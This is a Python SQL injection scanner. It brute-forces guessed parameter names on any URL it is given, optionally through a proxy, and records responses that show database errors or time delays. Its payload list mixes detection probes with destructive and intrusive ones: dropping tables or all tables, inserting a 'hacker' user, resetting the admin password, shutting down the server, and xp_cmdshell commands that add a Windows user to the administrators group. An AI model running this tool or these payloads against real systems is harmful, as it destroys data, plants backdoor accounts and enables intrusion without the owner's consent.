import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, init

init(autoreset=True)  # Automatically reset color after each print

def guess_params(params):
    if not params:
        common_params = [
            "id", "page", "user", "search", "q", "file", "path", "folder", "document", "dir",
            "cat", "category", "item", "name", "product", "lang", "lang_id", "sort", "order",
            "type", "view", "action", "filter", "token", "session", "sid", "ref", "redirect",
            "url", "next", "page_id", "start", "limit", "offset", "count", "email", "username",
            "password", "passwd", "login", "logout", "submit", "query", "content", "topic",
            "thread", "post", "comment", "id_user", "user_id", "uid", "pid", "cid", "aid",
            "img", "image", "photo", "thumb", "size", "width", "height", "color", "lang_code",
            "lang_id", "lang_name", "lang_iso", "locale", "date", "time", "datetime", "timestamp",
            "debug", "test", "mode", "level", "page_num", "page_no", "num", "number", "limit",
            "offset", "offset_start", "keyword", "search_term", "search_query", "category_id",
            "cat_id", "tag", "tag_id", "product_id", "prod_id", "order_id", "session_id",
            "cart_id", "token_id", "csrf_token", "auth_token", "access_token", "api_key",
            "apikey", "client_id", "client_secret", "callback", "format", "json", "xml", "html",
            "download", "file_name", "filename", "filetype", "ext", "extension", "version",
            "v", "lang_iso", "lang_code", "lang_key", "sort_by", "sort_order", "asc", "desc",
            "page_size", "rows", "per_page", "perpage", "max", "min", "price_min", "price_max",
            "rating", "review", "user_agent", "ua", "referer", "referrer", "utm_source",
            "utm_medium", "utm_campaign", "utm_term", "utm_content", "click_id", "tracking_id",
            "session_key", "session_token", "device", "platform", "os", "browser", "ip",
            "location", "city", "country", "region", "state", "zip", "postal_code", "lat", "lon",
            "latitude", "longitude", "debug_mode", "test_mode", "env", "environment", "langId",
            "categoryName", "subcat", "subcategory", "productName", "product_code", "sku",
            "barcode", "brand", "manufacturer", "supplier", "vendor", "order_date", "date_from",
            "date_to", "start_date", "end_date", "from", "to", "pageIndex", "pageNumber",
            "pagecount", "pageCount", "limitStart", "limitEnd", "cursor", "token_value",
            "auth_key", "authcode", "auth_code", "password_reset", "reset_token", "resetcode",
            "verify_token", "activation_code", "activation_token", "code", "key", "id_code",
            "ref_code", "promo_code", "coupon_code", "discount_code", "amount", "total",
            "subtotal", "tax", "shipping", "discount", "fee", "currency", "curr", "country_code",
            "langId", "langId", "lang_id", "langid", "default_lang", "language", "lang_code",
            "langKey", "isAdmin", "is_admin", "admin", "admin_id", "admin_user", "role", "roles",
            "permission", "permissions", "access", "access_level", "level", "status", "state",
            "active", "inactive", "enabled", "disabled", "visible", "hidden", "flag", "flags",
            "page_title", "title", "description", "desc", "summary", "keywords", "meta",
            "meta_title", "meta_description", "meta_keywords", "header", "footer", "sidebar",
            "content_id", "content_type", "post_id", "blog_id", "article_id", "news_id",
            "event_id", "calendar_id", "task_id", "ticket_id", "case_id", "issue_id", "bug_id",
            "error_id", "log_id", "message_id", "thread_id", "conversation_id", "chat_id",
            "session_id", "connection_id", "device_id", "hardware_id", "software_id", "profile_id",
            "account_id", "client_id", "customer_id", "member_id", "subscriber_id", "visitor_id",
            "guest_id", "usergroup", "group_id", "team_id", "project_id", "workspace_id",
            "folder_id", "directory", "path", "filepath", "filename", "file", "image_id",
            "photo_id", "video_id", "audio_id", "media_id", "attachment_id", "resource_id",
            "link", "url", "redirect_url", "return_url", "callback_url", "next_url", "prev_url",
            "referer_url", "target_url", "origin_url", "source_url", "destination_url",
            "host", "hostname", "domain", "subdomain", "port", "protocol", "scheme", "api_version",
            "api_key", "api_secret", "api_token", "access_token", "refresh_token", "jwt",
            "auth_token", "auth_code", "auth_key", "session_token", "cookie", "cookie_id",
            "remember_me", "keep_logged_in", "login_token", "nonce", "timestamp", "date",
            "time", "datetime", "expiry", "expire", "expires", "valid_until", "start_time",
            "end_time", "limit", "offset", "page", "per_page", "perpage", "size", "length",
            "width", "height", "depth", "weight", "color", "background_color", "font_size",
            "font_family", "font_weight", "line_height", "letter_spacing", "text_align",
            "text_decoration", "visibility", "display", "position", "top", "left", "right",
            "bottom", "margin", "padding", "border", "radius", "opacity", "z_index", "order",
            "flex", "grid", "align", "justify", "content", "items", "self", "overflow",
            "cursor", "pointer_events", "resize", "box_shadow", "transition", "animation",
            "transform", "filter", "backdrop_filter", "user_select", "pointer_events", "zoom",
            "columns", "rows", "gap", "column_gap", "row_gap", "grid_template", "grid_area",
            "grid_row", "grid_column", "place_items", "place_content", "place_self"
        ]
        params = {p: [''] for p in common_params}
    return params

def build_url(parsed, params):
    query = urlencode(params, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

def run():
    print("Running SQL Injection scan with automatic parameter detection...")
    url = input("Enter target URL (with or without parameters): ").strip()
    proxy_input = input("Enter proxy (http://user:pass@host:port) or leave blank for none: ").strip()
    proxies = None
    if proxy_input:
        proxies = {
            "http": proxy_input,
            "https": proxy_input,
        }
        print(Fore.YELLOW + f"Using proxy: {proxy_input}")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = guess_params(params)

    payloads = [
    "'", "%27", '"', "' OR '1'='1", '" OR "1"="1', "';--", "' OR 1=1 --", "' OR 'a'='a",
    "nu11secur1ty' or 1=1#", "'", " or 1=1", "' or 1=1", " or 1=1", " or 1=1--",
    "' or 1=1--", " or 1=1--", " or 1=1-- -", "' or 1=1-- -", " or 1=1-- -", "' or 'x'='x",
    ' or "x"="x', "') or 1=1--", " ) or 1=1--", "') or 1=1-- -", ") or 1=1-- -",
    "') or ('x')=('x", ') or ("x")=("x', " or true", "' or true", " or true",
    "'''' or true--", "' or true--", " or true--", " or true-- -", "' or true-- -",
    " or true-- -", "))", "'))", "))", "))--", "'))--", "'''))--", "))-- -", "'))-- -",
    "))-- -", ";SELECT version()", ";SELECT @@version", ";SELECT version();",
    ";SELECT @@version;", ";SELECT version();--", ";SELECT @@version;--",
    "' OR 1=1#", "' OR 1=1/*", "' OR '1'='1'--", "' OR '1'='1'/*", "' OR ''=''", "' OR 1=1-- -",
    "' OR 1=1# --", "' OR 1=1;--", "' OR 1=1;#", "' OR 1=1;/*", "' OR 1=1 UNION SELECT NULL--",
    "' OR 1=1 UNION SELECT NULL#", "' OR 1=1 UNION SELECT NULL/*", "' OR EXISTS(SELECT * FROM users)--",
    "' OR EXISTS(SELECT * FROM users)#", "' OR EXISTS(SELECT * FROM users)/*",
    "' OR 1=1 LIMIT 1--", "' OR 1=1 LIMIT 1#", "' OR 1=1 LIMIT 1/*", "' OR 1=1 ORDER BY 1--",
    "' OR 1=1 ORDER BY 1#", "' OR 1=1 ORDER BY 1/*", "' OR 'a'='a'--", "' OR 'a'='a'#",
    "' OR 'a'='a'/*", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;--", "' OR 1=1;#",
    "' OR 1=1;/*", "' OR 1=1 OR 1=1--", "' OR 1=1 OR 1=1#", "' OR 1=1 OR 1=1/*",
    "' OR 1=1 OR 1=1;--", "' OR 1=1 OR 1=1;#", "' OR 1=1 OR 1=1;/*", "' OR 1=1 AND 1=1--",
    "' OR 1=1 AND 1=1#", "' OR 1=1 AND 1=1/*", "' OR 1=1 AND 1=1;--", "' OR 1=1 AND 1=1;#",
    "' OR 1=1 AND 1=1;/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
    "' OR '1'='1';--", "' OR '1'='1';#", "' OR '1'='1';/*", "' OR '1'='1' AND '1'='1'--",
    "' OR '1'='1' AND '1'='1'#", "' OR '1'='1' AND '1'='1'/*", "' OR '1'='1' AND '1'='1';--",
    "' OR '1'='1' AND '1'='1';#", "' OR '1'='1' AND '1'='1';/*", "' OR ''='--", "' OR ''='#",
    "' OR ''='/*", "' OR ''=';--", "' OR ''=';#", "' OR ''=';/*", "' OR 'x'='x'--", "' OR 'x'='x'#",
    "' OR 'x'='x'/*", "' OR 'x'='x';--", "' OR 'x'='x';#", "' OR 'x'='x';/*", "' OR 'x'='x' OR 'x'='x'--",
    "' OR 'x'='x' OR 'x'='x'#", "' OR 'x'='x' OR 'x'='x'/*", "' OR 'x'='x' OR 'x'='x';--",
    "' OR 'x'='x' OR 'x'='x';#", "' OR 'x'='x' OR 'x'='x';/*", "' OR 'x'='x' AND 'x'='x'--",
    "' OR 'x'='x' AND 'x'='x'#", "' OR 'x'='x' AND 'x'='x'/*", "' OR 'x'='x' AND 'x'='x';--",
    "' OR 'x'='x' AND 'x'='x';#", "' OR 'x'='x' AND 'x'='x';/*", "' OR 1=1 -- -", "' OR 1=1 #",
    "' OR 1=1; --", "' OR 1=1; #", "' OR 1=1; /*", "' OR 1=1 UNION SELECT 1,2,3--",
    "' OR 1=1 UNION SELECT 1,2,3#", "' OR 1=1 UNION SELECT 1,2,3/*", "' OR 1=1 UNION SELECT username,password FROM users--",
    "' OR 1=1 UNION SELECT username,password FROM users#", "' OR 1=1 UNION SELECT username,password FROM users/*",
    "' OR 1=1; DROP TABLE users --", "' OR 1=1; DROP TABLE users #", "' OR 1=1; DROP TABLE users /*",
    "' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'password') --",
    "' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'password') #",
    "' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'password') /*",
    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin' --",
    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin' #",
    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin' /*",
    "' OR 1=1; EXEC xp_cmdshell('dir') --", "' OR 1=1; EXEC xp_cmdshell('dir') #",
    "' OR 1=1; EXEC xp_cmdshell('dir') /*", "' OR 1=1; WAITFOR DELAY '0:0:5' --",
    "' OR 1=1; WAITFOR DELAY '0:0:5' #", "' OR 1=1; WAITFOR DELAY '0:0:5' /*",
    "' OR 1=1; --", "' OR 1=1#", "' OR 1=1/*", "' OR 1=1;--", "' OR 1=1;#",
    # Adding more variations:
    "' OR 1=1; EXEC xp_cmdshell('whoami') --", "' OR 1=1; EXEC xp_cmdshell('whoami') #",
    "' OR 1=1; EXEC xp_cmdshell('whoami') /*", "' OR 1=1 UNION SELECT null,null--",
    "' OR 1=1 UNION SELECT null,null#", "' OR 1=1 UNION SELECT null,null/*", "' OR 1=1; SHUTDOWN; --",
    "' OR 1=1; SHUTDOWN; #", "' OR 1=1; SHUTDOWN; /*", "' OR 1=1; SELECT sleep(5)--",
    "' OR 1=1; SELECT sleep(5)#", "' OR 1=1; SELECT sleep(5)/*", "' OR 1=1; EXEC xp_regread --",
    "' OR 1=1; EXEC xp_regread #", "' OR 1=1; EXEC xp_regread /*", "' OR 1=1; WAITFOR DELAY '0:0:10' --",
    "' OR 1=1; WAITFOR DELAY '0:0:10' #", "' OR 1=1; WAITFOR DELAY '0:0:10' /*", "' OR 1=1 AND 1=1 --",
    "' OR 1=1 AND 1=1 #", "' OR 1=1 AND 1=1 /*", "' OR 1=1 AND 1=1;--", "' OR 1=1 AND 1=1;#",
    "' OR 1=1 AND 1=1;/*", "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES) --",
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES) #",
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES) /*",
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS) --",
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS) #",
    "' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS) /*",
    "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
    "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns #",
    "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns /*",
    "' OR 1=1 UNION SELECT null, null FROM dual --",
    "' OR 1=1 UNION SELECT null, null FROM dual #",
    "' OR 1=1 UNION SELECT null, null FROM dual /*",
    "' OR 1=1 AND substring(@@version,1,1)='5' --",
    "' OR 1=1 AND substring(@@version,1,1)='5' #",
    "' OR 1=1 AND substring(@@version,1,1)='5' /*",
    "' OR 1=1 AND ascii(substring(user(),1,1))>64 --",
    "' OR 1=1 AND ascii(substring(user(),1,1))>64 #",
    "' OR 1=1 AND ascii(substring(user(),1,1))>64 /*",
    "' OR 1=1 UNION SELECT database(), user() --",
    "' OR 1=1 UNION SELECT database(), user() #",
    "' OR 1=1 UNION SELECT database(), user() /*",
    "'; EXEC xp_cmdshell 'ping 127.0.0.1' --",
    "'; EXEC xp_cmdshell 'ping 127.0.0.1' #",
    "'; EXEC xp_cmdshell 'ping 127.0.0.1' /*",
    "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL --",
    "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL #",
    "' OR 1=1 UNION ALL SELECT NULL,NULL,NULL /*",
    "' OR 1=1 AND 1=1 AND 1=1 --",
    "' OR 1=1 AND 1=1 AND 1=1 #",
    "' OR 1=1 AND 1=1 AND 1=1 /*",
    "' OR 1=1 AND 1=1 OR 1=1 --",
    "' OR 1=1 AND 1=1 OR 1=1 #",
    "' OR 1=1 AND 1=1 OR 1=1 /*",
    "' OR 1=1 OR 1=1 OR 1=1 --",
    "' OR 1=1 OR 1=1 OR 1=1 #",
    "' OR 1=1 OR 1=1 OR 1=1 /*",
    "'; WAITFOR DELAY '0:0:10' --",
    "'; WAITFOR DELAY '0:0:10' #",
    "'; WAITFOR DELAY '0:0:10' /*",
    "'; DROP TABLE users; --",
    "'; DROP TABLE users; #",
    "'; DROP TABLE users; /*",
    "'; EXEC sp_msforeachtable 'DROP TABLE ?' --",
    "'; EXEC sp_msforeachtable 'DROP TABLE ?' #",
    "'; EXEC sp_msforeachtable 'DROP TABLE ?' /*",
    "'; EXEC xp_cmdshell('net user test test /add') --",
    "'; EXEC xp_cmdshell('net user test test /add') #",
    "'; EXEC xp_cmdshell('net user test test /add') /*",
    "'; EXEC xp_cmdshell('net localgroup administrators test /add') --",
    "'; EXEC xp_cmdshell('net localgroup administrators test /add') #",
    "'; EXEC xp_cmdshell('net localgroup administrators test /add') /*",
    "'; EXEC xp_cmdshell('net user /add test test') --",
    "'; EXEC xp_cmdshell('net user /add test test') #",
    "'; EXEC xp_cmdshell('net user /add test test') /*",
    "' OR 1=1; WAITFOR DELAY '0:0:5' --",
    "' OR 1=1; WAITFOR DELAY '0:0:5' #",
    "' OR 1=1; WAITFOR DELAY '0:0:5' /*",
    "' OR 1=1; EXEC xp_cmdshell('whoami') --",
    "' OR 1=1; EXEC xp_cmdshell('whoami') #",
    "' OR 1=1; EXEC xp_cmdshell('whoami') /*",
    "' OR 1=1; EXEC master..xp_cmdshell 'dir' --",
    "' OR 1=1; EXEC master..xp_cmdshell 'dir' #",
    "' OR 1=1; EXEC master..xp_cmdshell 'dir' /*",
    "' OR 1=1; EXEC xp_cmdshell('net user') --",
    "' OR 1=1; EXEC xp_cmdshell('net user') #",
    "' OR 1=1; EXEC xp_cmdshell('net user') /*",
    "' OR 1=1; EXEC xp_cmdshell('tasklist') --",
    "' OR 1=1; EXEC xp_cmdshell('tasklist') #",
    "' OR 1=1; EXEC xp_cmdshell('tasklist') /*",
    "' OR 1=1; EXEC xp_cmdshell('netstat -an') --",
    "' OR 1=1; EXEC xp_cmdshell('netstat -an') #",
    "' OR 1=1; EXEC xp_cmdshell('netstat -an') /*",
    "' OR 1=1; EXEC xp_cmdshell('ipconfig') --",
    "' OR 1=1; EXEC xp_cmdshell('ipconfig') #",
    "' OR 1=1; EXEC xp_cmdshell('ipconfig') /*",
    "' OR 1=1; EXEC xp_cmdshell('whoami /priv') --",
    "' OR 1=1; EXEC xp_cmdshell('whoami /priv') #",
    "' OR 1=1; EXEC xp_cmdshell('whoami /priv') /*",
    "' OR 1=1; EXEC xp_cmdshell('net localgroup') --",
    "' OR 1=1; EXEC xp_cmdshell('net localgroup') #",
    "' OR 1=1; EXEC xp_cmdshell('net localgroup') /*",
]

    results = []

    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; SQLiScanner/1.0)"
    }

    print(Fore.CYAN + f"Testing parameters: {list(params.keys())}")
    for param in params.keys():
        original_value = params[param][0] if params[param] else ""
        print(Fore.MAGENTA + f"\nTesting parameter: {param}")
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = original_value + payload
            test_url = build_url(parsed, test_params)
            try:
                start_time = time.time()
                response = session.get(test_url, headers=headers, proxies=proxies, timeout=10)
                duration = time.time() - start_time
                content = response.text.lower()

                # Basic SQL error signatures
                sql_errors = [
                    "you have an error in your sql syntax",
                    "warning: mysql",
                    "unclosed quotation mark after the character string",
                    "quoted string not properly terminated",
                    "sql syntax error",
                    "mysql_fetch",
                    "num_rows",
                    "syntax error",
                    "mysql_num_rows()",
                    "mysql_query()",
                    "mysql_num_rows",
                    "pg_query()",
                    "pg_exec()",
                    "pg_num_rows",
                    "sql error",
                    "syntax error in query",
                    "microsoft ole db provider for sql server",
                    "jet database engine",
                    "ora-01756",
                    "ora-00933",
                    "ora-00936",
                    "ora-00921",
                    "syntax error",
                    "odbc",
                    "sqlstate",
                    "sqlsrv",
                    "sqlite",
                    "syntax error near",
                    "warning: pg_",
                    "syntax error at or near",
                    "syntax error in SQL statement",
                ]

                error_found = any(err in content for err in sql_errors)
                delay_found = duration > 4  # 4 seconds threshold for time-based injections

                if error_found or delay_found:
                    message = ""
                    if error_found:
                        message += "SQL error detected"
                    if delay_found:
                        if message:
                            message += " and "
                        message += f"Time delay detected ({duration:.2f}s)"
                    print(Fore.RED + f"Potential SQL Injection found on parameter '{param}' with payload '{payload}': {message}")
                    results.append({
                        "parameter": param,
                        "payload": payload,
                        "message": message,
                        "url": test_url,
                        "response_time": duration,
                        "response_snippet": content[:200].replace('\n',' ').replace('\r',' ')
                    })
            except Exception as e:
                print(Fore.YELLOW + f"Request error with payload '{payload}': {e}")

    if results:
        filename = "sqli_scan_report.html"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("<html><head><title>SQLi Scan Report</title>")
            f.write("<style>body { font-family: Arial, sans-serif; background:#f9f9f9; }")
            f.write("table { border-collapse: collapse; width: 100%; }")
            f.write("th, td { border: 1px solid #ddd; padding: 8px; }")
            f.write("th { background-color: #4CAF50; color: white; }")
            f.write("tr:nth-child(even){background-color: #f2f2f2;}</style></head><body>")
            f.write("<h1>SQL Injection Scan Report</h1>")
            f.write(f"<p>Target URL: {url}</p>")
            f.write("<table>")
            f.write("<tr><th>Parameter</th><th>Payload</th><th>Message</th><th>Response Time (s)</th><th>Tested URL</th><th>Response Snippet</th></tr>")
            for r in results:
                f.write(f"<tr><td>{r['parameter']}</td><td>{r['payload']}</td><td>{r['message']}</td><td>{r['response_time']:.2f}</td><td><a href='{r['url']}' target='_blank'>Link</a></td><td>{r['response_snippet']}</td></tr>")
            f.write("</table></body></html>")
        print(Fore.GREEN + f"\nScan completed. Report saved to '{filename}'.")
    else:
        print(Fore.GREEN + "Scan completed. No potential SQL Injection vulnerabilities detected.")

if __name__ == "__main__":
    run()
